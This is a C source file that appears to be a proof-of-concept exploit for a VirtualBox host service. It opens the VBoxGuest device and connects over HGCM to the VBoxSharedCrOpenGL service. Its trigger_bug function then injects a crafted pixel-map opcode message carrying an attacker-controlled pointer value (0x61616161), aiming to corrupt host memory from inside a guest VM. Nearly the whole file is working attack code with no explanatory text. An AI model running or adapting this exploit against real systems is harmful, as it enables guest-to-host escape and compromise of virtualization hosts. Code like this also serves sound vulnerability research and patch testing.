#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include "stdint.h"
#include "vboxguest.h"
#include "cr_protocol.h"
#include "err.h"
#include "vboxcropenglsvc.h"

#define VBOXGUEST_DEVICE_NAME "\\\\.\\VBoxGuest"
#define CR_PIXELMAPFV_OPCODE 126
#define GL_PIXEL_MAP_S_TO_S			0x0C71


HANDLE open_device() {
	HANDLE hDevice = CreateFile(VBOXGUEST_DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Could not open device %s .\n", VBOXGUEST_DEVICE_NAME);
		exit(EXIT_FAILURE);
	}

	printf("[+] Handle to %s: 0x%X\n", VBOXGUEST_DEVICE_NAME, (unsigned int)hDevice);
	return hDevice;
}

uint32_t do_connect(HANDLE hDevice)
{
	VBGLIOCHGCMCONNECT info;
	memset(&info, 0, sizeof(info));
	VBGLREQHDR_INIT(&info.Hdr, HGCM_CONNECT);
	info.u.In.Loc.type = VMMDevHGCMLoc_LocalHost_Existing;
	strcpy(info.u.In.Loc.u.host.achName, "VBoxSharedCrOpenGL");
	PVBGLREQHDR pHdr = &info.Hdr;
	DWORD cbReturned = (ULONG)pHdr->cbOut;

	if (DeviceIoControl(hDevice, VBGL_IOCTL_HGCM_CONNECT, pHdr, pHdr->cbIn, pHdr, cbReturned, &cbReturned, NULL))
	{
		printf("HGCM connect was successful: client id =0x%x\n", info.u.Out.idClient);
		return info.u.Out.idClient;
	}
	printf("ERROR: connect! LastError: %d\n", GetLastError());
	return 0;
}

void do_disconnect(HANDLE hDevice, uint32_t u32ClientID) {
	BOOL rc;
	VBGLIOCHGCMDISCONNECT info;

	memset(&info, 0, sizeof(info));
	VBGLREQHDR_INIT(&info.Hdr, HGCM_DISCONNECT);
	info.u.In.idClient = u32ClientID;
	PVBGLREQHDR pHdr = &info.Hdr;
	DWORD cbReturned = (ULONG)pHdr->cbOut;

	printf("Sending VBOXGUEST_IOCTL_HGCM_DISCONNECT message...\n");
	rc = DeviceIoControl(hDevice, VBGL_IOCTL_HGCM_DISCONNECT, pHdr, pHdr->cbIn, pHdr, cbReturned, &cbReturned, NULL);
	if (!rc) {
		printf("ERROR: DeviceIoControl failed in function do_disconnect()! LastError: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	printf("HGCM disconnect was successful.\n");
}

void set_version(HANDLE hDevice, uint32_t u32ClientID) {
	CRVBOXHGCMSETVERSION parms;
	DWORD cbReturned = 0;
	BOOL rc;

	memset(&parms, 0, sizeof(parms));
	VBGL_HGCM_HDR_INIT(&parms.hdr, u32ClientID, SHCRGL_GUEST_FN_SET_VERSION, SHCRGL_CPARMS_SET_VERSION);

	parms.vMajor.type = VMMDevHGCMParmType_32bit;
	parms.vMajor.u.value32 = CR_PROTOCOL_VERSION_MAJOR;
	parms.vMinor.type = VMMDevHGCMParmType_32bit;
	parms.vMinor.u.value32 = CR_PROTOCOL_VERSION_MINOR;

	rc = DeviceIoControl(hDevice, VBGL_IOCTL_HGCM_CALL(sizeof(parms)), &parms, sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

	if (!rc) {
		printf("ERROR: DeviceIoControl failed in function set_version()! LastError: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	printf("HGCM set version was successful\n");
}

void set_pid(HANDLE hDevice, uint32_t u32ClientID)
{
	CRVBOXHGCMSETPID parms;
	DWORD cbReturned = 0;
	int rc;

	memset(&parms, 0, sizeof(parms));
	VBGL_HGCM_HDR_INIT(&parms.hdr, u32ClientID, SHCRGL_GUEST_FN_SET_PID, SHCRGL_CPARMS_SET_PID);

	parms.u64PID.type = VMMDevHGCMParmType_64bit;
	parms.u64PID.u.value64 = (uintptr_t)GetCurrentProcessId();

	Assert(parms.u64PID.u.value64);

	rc = DeviceIoControl(hDevice, VBGL_IOCTL_HGCM_CALL(sizeof(parms)), &parms, sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);

	if (!rc) {
		printf("ERROR: DeviceIoControl failed in function set_pid()! LastError: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}
	printf("HGCM set pid was successful\n");

}

void trigger_bug(HANDLE hDevice, uint32_t u32ClientID) {
	CRVBOXHGCMINJECT parms;
	CRMessageOpcodes msg;

	DWORD cbReturned = 0;
	BOOL rc;
	char mybuf[1024];

	memset(&msg, 0, sizeof(msg));
	memset(mybuf, 0, sizeof(mybuf));
	
	msg.header.type = CR_MESSAGE_OPCODES;
	msg.header.conn_id = 0x8899;
	msg.numOpcodes = 1;

	memcpy(mybuf, &msg, sizeof(msg));
	mybuf[sizeof(msg) + 3] = CR_PIXELMAPFV_OPCODE;
	*(unsigned int*)(&mybuf[sizeof(msg) + 8]) = GL_PIXEL_MAP_S_TO_S;
	*(unsigned int*)(&mybuf[sizeof(msg) + 12]) = 10;
	*(unsigned int*)(&mybuf[sizeof(msg) + 16]) = 1;
	*(unsigned int*)(&mybuf[sizeof(msg) + 20]) = 0x61616161; //Untrusted pointer
	
	memset(&parms, 0, sizeof(parms));
	parms.hdr.u32ClientID = u32ClientID; 
	parms.hdr.u32Function = SHCRGL_GUEST_FN_INJECT;
	parms.hdr.cParms = SHCRGL_CPARMS_INJECT;
	parms.hdr.Hdr.cbIn = 0x40;
	parms.hdr.Hdr.cbOut = 0x40;
	parms.hdr.Hdr.uVersion = VBGLREQHDR_VERSION;
	parms.u32ClientID.type = VMMDevHGCMParmType_32bit;
	parms.u32ClientID.u.value32 = u32ClientID;

	parms.pBuffer.type = VMMDevHGCMParmType_LinAddr_In;
	parms.pBuffer.u.Pointer.size = sizeof(mybuf);
	parms.pBuffer.u.Pointer.u.linearAddr = (uintptr_t)mybuf;

	rc = DeviceIoControl(hDevice, VBGL_IOCTL_HGCM_CALL(sizeof(parms)), &parms, sizeof(parms), &parms, sizeof(parms), &cbReturned, NULL);
	
	if (!rc) {
		printf("ERROR: DeviceIoControl failed in function trigger_bug()!. LastError: %d\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	printf("HGCM Call successful. cbReturned: 0x%X.\n", cbReturned);
}

int main(int argc, char** argv)
{
	HANDLE hDevice = open_device();
	uint32_t client_id = do_connect(hDevice);
	if (client_id)
	{
		set_version(hDevice, client_id);
		set_pid(hDevice, client_id);
		trigger_bug(hDevice, client_id);
	}
	do_disconnect(hDevice, client_id);
	return 0;
}

z